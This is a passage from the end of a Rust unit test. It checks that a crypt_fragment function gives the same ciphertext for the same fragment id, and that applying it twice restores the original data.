        crypt_fragment(&mut enc1, 42);
        crypt_fragment(&mut enc2, 42);

        // Same fragment_id produces same keystream
        assert_eq!(enc1, enc2, "Same fragment_id should produce same ciphertext");

        // Decrypt back
        crypt_fragment(&mut enc1, 42);
        assert_eq!(enc1, data1, "Double application should restore plaintext");
    }
}
